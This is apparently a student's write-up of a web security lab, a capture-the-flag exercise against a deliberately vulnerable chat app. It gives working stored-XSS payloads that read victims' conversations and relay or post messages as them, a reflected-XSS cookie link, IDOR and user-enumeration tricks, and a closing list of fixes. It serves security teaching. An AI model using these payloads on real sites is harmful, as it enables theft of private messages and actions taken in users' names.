[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-24ddc0f5d75046c5622901739e7c5dd533143b0c8e959d652212380cedb1ea36.svg)](https://classroom.github.com/a/Nx5uMN_1)
# 7 Security

Énoncé [ici](https://web-classroom.github.io/labos/labo-7-security.html)

## Partie 1

### Flag 1

**Flag**: flag1:fc7ec1d5433fedd2 - edwin.haeffner1

**Exploit**:

To send to Elon -> 

```html
<img src="https://pbs.twimg.com/media/F01O3WzWAAAOayr.jpg" onload="if (document.querySelector('#header .name').innerText !== 'Edwin') {
fetch('/conversation/b846414536e85208').then(function (response) { return response.text();}).then(function (html) {
document.getElementById('message').innerHTML = html;
document.getElementById('messageButton').click();});
}" width="100">
```

### Flag 2

**Flag**: flag2:7a3a245f0e4f1c8a - edwin.haeffner1
**Exploit**: 

To send to Elon -> 

```html
<img src="https://pbs.twimg.com/media/F01O3WzWAAAOayr.jpg" onload="if (document.querySelector('#header .name').innerText !== 'Häffner Edwin') {
let t = Array(...document.querySelectorAll('.conversation .last-message')).map(c => c.innerHTML.trim()).join('|||');
console.log(t)
document.getElementById('message').innerHTML = t;
document.getElementById('messageButton').click()
}" width="100">
```


### Flag 3

**Flag**: flag3:8f64c23480b8a1d5 - edwin.haeffner1

**Exploit**: 

First we get Trump's conversation ID with this : 

get Id : 

```html
<img src="https://pbs.twimg.com/media/F01O3WzWAAAOayr.jpg" onload="if (document.querySelector('#header .name').innerText !== 'Häffner Edwin') {
let t = Array(...document.querySelectorAll('.conversation')).map(c => c.id).join('|||');
console.log(t)
document.getElementById('message').innerHTML = t;
document.getElementById('messageButton').click()
}" width="100">
```
trump conv id : conversationb846414536e85208

And then we send those two messages to Elon ->

```html
<img src="https://pbs.twimg.com/media/F01O3WzWAAAOayr.jpg" onload="if (document.querySelector('#header .name').innerText !== 'Edwin') {
    fetch(`/conversation/b846414536e85208`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ message: 'gimme the rest of the codes pls' })
    })
        .catch((error) => console.log(error));
}" width="100">
```

And then

```html
<img src="https://pbs.twimg.com/media/F01O3WzWAAAOayr.jpg" onload="if (document.querySelector('#header .name').innerText !== 'Edwin') {
fetch('/conversation/b846414536e85208').then(function (response) { return response.text();}).then(function (html) {
document.getElementById('message').innerHTML = html;
document.getElementById('messageButton').click();});
}" width="100">
```

## Partie 2

### Flag 4

**Flag**: flag4:2b8362021c6866d9

**Exploit**:

By renaming myself "nextTimeout", we can overwrite the global variable that stores the timeout timestamp for 
automatically logging out inactive users. This causes the timeout mechanism to malfunction...

### Flag 5

**Flag**: flag5:35ea41b43585287f

**Exploit**: 

Unlike previously, it seems that we can access any discussion we want by putting the conversation ID in the URL.
Also, when we send a message that shouldn't be accepted (like an empty message), the server sends us an error. By examining
the error's content we get this : 

```json
{
    "error": "Operation not permitted",
    "reason": "Message is empty",
    "details": {
        "message": "",
        "sender": {
            "username": "edwin.haeffner2",
            "displayName": "h",
            "uniqueId": "856e248644a9fcbe",
            "conversationIds": [
                "2d40d4cc24b237ae",
                "231a781a0367b8b4"
            ]
        },
        "receiver": {
            "username": "Elon_edwin.haeffner2",
            "displayName": "Elon Musk",
            "uniqueId": "5cce529854010aa0",
            "conversationIds": [
                "2d40d4cc24b237ae",
                "acb11de20cc07496"
            ]
        }
    }
}
```

We can then see that Elon has another conversation ID that isn't us or trump. By typing this in the URL we get to see their
discussion with Mark Zuckerberg along the error code telling us that we can't access this discussion. And it contains the flag !

### Flag 6

Personnes inscrites à ChatsApp:
- `michelle.obama` true
- `barack.obama` false
- `hillary.clinton` true
- `george.w.bush` true
- `jane.doe` false
- `sam.altman` true
- `mira.murati` false
- `olivier.lemer` false

**Exploit**: 

We can see that when we try to log in with an existing user (myself) with a wrong password, it takes more than three seconds to
spit out an error message, but when I try with something random, it only takes around 100ms...


## Exploit Supplémentaire

Lien vers ChatsApp qui, lorsque l'on clique dessus, exécute `alert(document.cookie)` dans le browser, que l'on soit actuellement connecté ou non à ChatsApp :

The link used since we display the content of the param directly on the page : 

`http://185.143.102.102:8080/login?error=%3Cscript%3Ealert(document.cookie);%3C/script%3E`

## Correction des vulnérabilités
Si vous effectuez d'autres modifications que celles demandées, merci de les lister ici :

Nous avons fait les changements demandés : 

- Les attaques XSS ne devraient plus être possibles grâce à `xss.filterXSS()`
- Les erreurs n'indiquent plus trop d'informations
- Nouveau système d'authentification sécurisé avec `passport` et hashage des mots de passe avec `bcrypt`
- Le temps de connexion prend à peu près le même temps, indépendamment du fait que l'utilisateur existe ou non.
- Ajout pour que les cookies doivent provenir du même site afin d'éviter les attaques CSRF (non demandé)